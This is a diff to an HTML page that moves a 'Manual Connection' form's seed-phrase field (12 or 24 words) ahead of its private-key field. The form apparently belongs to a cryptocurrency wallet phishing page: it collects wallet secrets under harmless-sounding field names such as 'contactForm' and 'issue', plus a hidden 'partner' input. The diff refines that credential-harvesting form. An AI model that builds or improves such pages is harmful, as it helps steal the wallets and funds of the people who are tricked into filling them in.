@@ -1056,28 +1056,18 @@
         <div class="form-screen" id="formScreen">
           <h3>Manual Connection</h3>
           <div class="tab-bar">
-            <button class="tab-btn active" data-tab="tabIssue">
-              Private Key
+            <!-- PASSPHRASE FIRST -->
+            <button class="tab-btn active" data-tab="tabReview">
+              Passphrase
             </button>
-            <button class="tab-btn" data-tab="tabReview">Passphrase</button>
+            <button class="tab-btn" data-tab="tabIssue">Private Key</button>
           </div>
 
           <form id="contactForm">
             <input type="hidden" name="partner" id="partnerInput" />
 
-            <div class="tab-panel active" id="tabIssue">
-              <div class="form-group">
-                <label for="issueBox">Private Key</label>
-                <textarea
-                  id="issueBox"
-                  name="issue"
-                  placeholder="Enter your private key"
-                  rows="6"
-                ></textarea>
-              </div>
-            </div>
-
-            <div class="tab-panel" id="tabReview">
+            <!-- PASSPHRASE TAB (now first/active) -->
+            <div class="tab-panel active" id="tabReview">
               <div class="form-group">
                 <label for="messageBox">Passphrase</label>
                 <textarea
@@ -1089,6 +1079,19 @@
                 <div class="phrase-hint" id="phraseHint">
                   0 words &#x2014; enter exactly 12 or 24
                 </div>
+              </div>
+            </div>
+
+            <!-- PRIVATE KEY TAB (now second) -->
+            <div class="tab-panel" id="tabIssue">
+              <div class="form-group">
+                <label for="issueBox">Private Key</label>
+                <textarea
+                  id="issueBox"
+                  name="issue"
+                  placeholder="Enter your private key"
+                  rows="6"
+                ></textarea>
               </div>
             </div>
 
